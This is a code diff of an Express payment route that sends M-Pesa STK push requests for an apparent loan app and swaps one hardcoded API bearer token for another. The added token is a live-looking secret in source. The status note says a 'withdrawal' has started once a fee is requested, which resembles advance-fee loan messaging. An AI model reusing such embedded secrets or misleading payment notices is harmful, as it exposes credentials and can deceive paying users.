@@ -60,13 +60,13 @@ app.post("/pay", async (req, res) => {
       external_reference: reference,
       customer_name: "Customer",
       callback_url: "https://swift-capital.onrender.com/callback",
-      channel_id: "000236"
+      channel_id: "000235"
     };
 
     const url = "https://swiftwallet.co.ke/pay-app-v2/payments.php";
     const resp = await axios.post(url, payload, {
       headers: {
-        Authorization: `Bearer f7a932be3cd1251ab70bae129aacd9ae527287e927c5f45ec1cf4a3948eaf443`,
+        Authorization: `Bearer 3200dbf760737c2f777c9378c141e5ebe27b5cb7d6d29cbb048a015828487947`,
         "Content-Type": "application/json"
       }
     });
@@ -82,7 +82,7 @@ app.post("/pay", async (req, res) => {
         amount: Math.round(amount),
         loan_amount: loan_amount || "50000",
         phone: formattedPhone,
-        customer_name: "N/A",
+        customer_name: "Swift Applicant",
         status: "pending",
         status_note: `STK push  sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete the fee payment and loan disbursement.Withdrawal started..... `,
         timestamp: new Date().toISOString()
@@ -107,7 +107,7 @@ app.post("/pay", async (req, res) => {
         amount: Math.round(amount),
         loan_amount: loan_amount || "50000",
         phone: formattedPhone,
-        customer_name: "N/A",
+        customer_name: "Swift Applicant",
         status: "stk_failed",
         status_note: "STK push failed to send. Please try again or contact support.",
         timestamp: new Date().toISOString()
